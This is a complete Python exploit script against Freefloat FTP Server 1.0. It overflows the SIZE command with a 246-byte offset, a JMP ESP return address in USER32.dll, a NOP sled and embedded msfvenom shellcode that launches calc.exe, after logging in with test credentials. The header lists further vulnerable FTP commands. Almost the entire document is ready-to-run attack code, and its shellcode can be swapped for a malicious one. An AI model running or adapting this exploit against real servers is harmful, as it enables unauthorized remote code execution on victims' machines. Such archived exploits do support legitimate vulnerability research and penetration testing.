#!/usr/bin/env python
#---------------------------------------------------------------------------------------------#
# Software      = Freefloat FTP server version 1.0                                            #
# Download Link = http://www.mediafire.com/file/9cds1786340avnn/Freefloat+FTP+Server+v1.0.rar #
# Date          = 8/20/2017                                                                   #
# Reference     = https://packetstormsecurity.com/files/103746/freefloatftp-overflow.txt      #
# Author        = @ihack4falafel                                                              #
# Tested on     = Windows XP SP3 - Professional                                               #
# EIP Offset    = 246                                                                         #
# Badchars      = "\x00\x0A\x0D"                                                              #
# RET Address   = 7E429353 "\xFF\xE4" | [USER32.dll]                                          #
# Usage         = python exploit.py <target IP>                                               #        
#---------------------------------------------------------------------------------------------#

#---------------------------------------------------------------------------------------------#
# List of Vuln. Commands  = [DELE, MDTM, RETR, RMD, RNFR, RNTO, STOU, STOR, SIZE, APPE, STAT] #
#---------------------------------------------------------------------------------------------#

import sys
import socket
import struct
import time


if len(sys.argv) < 2:
  print "Usage               : python exploit.py <target IP>"
  print "Example             : python exploit.py 127.0.0.1"
  sys.exit(0)

HOST = sys.argv[1]

#------------------------------------------------------------------------------#
# msfvenom -p windows/exec CMD=calc.exe -b "\x00\x0A\x0D" -f python -v payload #
#------------------------------------------------------------------------------#

payload =  ""
payload += "\xbd\x71\xa7\xd9\x36\xdd\xc7\xd9\x74\x24\xf4\x5a"
payload += "\x31\xc9\xb1\x31\x31\x6a\x13\x83\xc2\x04\x03\x6a"
payload += "\x7e\x45\x2c\xca\x68\x0b\xcf\x33\x68\x6c\x59\xd6"
payload += "\x59\xac\x3d\x92\xc9\x1c\x35\xf6\xe5\xd7\x1b\xe3"
payload += "\x7e\x95\xb3\x04\x37\x10\xe2\x2b\xc8\x09\xd6\x2a"
payload += "\x4a\x50\x0b\x8d\x73\x9b\x5e\xcc\xb4\xc6\x93\x9c"
payload += "\x6d\x8c\x06\x31\x1a\xd8\x9a\xba\x50\xcc\x9a\x5f"
payload += "\x20\xef\x8b\xf1\x3b\xb6\x0b\xf3\xe8\xc2\x05\xeb"
payload += "\xed\xef\xdc\x80\xc5\x84\xde\x40\x14\x64\x4c\xad"
payload += "\x99\x97\x8c\xe9\x1d\x48\xfb\x03\x5e\xf5\xfc\xd7"
payload += "\x1d\x21\x88\xc3\x85\xa2\x2a\x28\x34\x66\xac\xbb"
payload += "\x3a\xc3\xba\xe4\x5e\xd2\x6f\x9f\x5a\x5f\x8e\x70"
payload += "\xeb\x1b\xb5\x54\xb0\xf8\xd4\xcd\x1c\xae\xe9\x0e"
payload += "\xff\x0f\x4c\x44\xed\x44\xfd\x07\x7b\x9a\x73\x32"
payload += "\xc9\x9c\x8b\x3d\x7d\xf5\xba\xb6\x12\x82\x42\x1d"
payload += "\x57\x7c\x09\x3c\xf1\x15\xd4\xd4\x40\x78\xe7\x02"
payload += "\x86\x85\x64\xa7\x76\x72\x74\xc2\x73\x3e\x32\x3e"
payload += "\x09\x2f\xd7\x40\xbe\x50\xf2\x22\x21\xc3\x9e\x8a"
payload += "\xc4\x63\x04\xd3"

#----------------------------#
#      Buffer Structure      #
#----------------------------#
# buffer = SIZE              #
# buffer = " "               #
# buffer = AAA...........AAA #
# buffer = EIP               #
# buffer = NOPSled           #
# buffer = payload           #
# buffer = BBB...........BBB #
# buffer = "\r\n"            #
#----------------------------#

buffer = "SIZE"
buffer += " "
buffer += "A" * 246
buffer += struct.pack('<L', 0x7E429353)
buffer += "\x90" * 40
buffer += payload
buffer += "B" * (1000-246-4-40-len(payload))
buffer += "\r\n"


try:
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((HOST, 21))
  print "[+] Connected to FreeFloat FTP Server with IP: %s and port: 21 " %(HOST)
  print "[+] sending USER test.."
  time.sleep(1)
  s.send("USER test\r\n")
  banner = s.recv(1024)
  print banner
  print "[+] sending PASS test.."
  time.sleep(1)
  s.send("PASS test\r\n")
  logged_in = s.recv(1024)
  print logged_in
  print "[+] sending %s bytes evil payload.." %len(buffer)
  time.sleep(1)
  s.send(buffer)
  print "FreeFloat FTP Server should be crashed by now \m/"
  s.close()
except Exception,msg:
  print "[+] Unable to connect to FreeFloat FTP Server"
  sys.exit(0)
